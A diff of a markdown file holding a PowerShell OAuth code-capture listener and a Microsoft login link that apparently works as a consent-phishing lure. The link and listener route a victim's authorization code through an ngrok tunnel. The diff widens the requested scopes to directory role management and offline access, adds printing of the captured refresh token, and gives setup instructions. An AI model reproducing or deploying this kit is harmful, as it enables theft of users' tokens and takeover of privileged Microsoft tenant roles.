@@ -187,7 +187,7 @@ Write-Host "Received a request! `n"
 
 
 # Get the authorization code from the request
-Write-Host "Full Query String: $($request.Url.Query) `n"
+Write-Host "Full URL String: $($request.Url) `n"
 $authCode = $request.QueryString["code"]
 if ($authCode) {
     Write-Host "Received Auth Code: $authCode `n"    
@@ -199,7 +199,7 @@ if ($authCode) {
         code          = $authCode
         redirect_uri  = $redirectUri
         grant_type    = "authorization_code"
-        scope         = "User.ReadWrite"
+        scope         = "User.ReadWrite RoleManagement.ReadWrite.Directory offline_access"
     }
     
     # Request to get the Access Token
@@ -210,6 +210,7 @@ if ($authCode) {
 	        -Body $body
         
 	    Write-Host "Access Token: $($tokenResponse.access_token) `n"
+	    Write-Host "Refresh Token: $($tokenResponse.refresh_token) `n"
     } catch {
 	    Write-Host "Error obtaining acces Token: ..."
     }
@@ -218,7 +219,7 @@ if ($authCode) {
     $response.Headers.Add("Location", $finalRedirectUrl)
     $response.OutputStream.Close()
     $response.Close()
-
+    
 } else {
     Write-Host "No authorization code found in the request."
 }
@@ -228,7 +229,8 @@ $listener.Stop()
 
 ```
 
-[hello there](https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://b9e6-152-115-163-102.ngrok-free.app&scope=User.ReadWrite%20RoleManagement.ReadWrite.Directory&response_mode=query&prompt=consent)
-
+https://login.microsoftonline.com/5dc7e152-c906-4d95-bd1a-bcf75eb3e939/oauth2/v2.0/authorize?client_id=675c27b6-e1ff-4a2c-924e-701186f97951&response_type=code&redirect_uri=https://b9e6-152-115-163-102.ngrok-free.app&&scope=User.ReadWrite%20RoleManagement.ReadWrite.Directory%20offline_access&response_mode=query&prompt=consent
+**use `ngrok http 5000` to start the server
+and Remember to update the url address both in the script and the link**
 
 
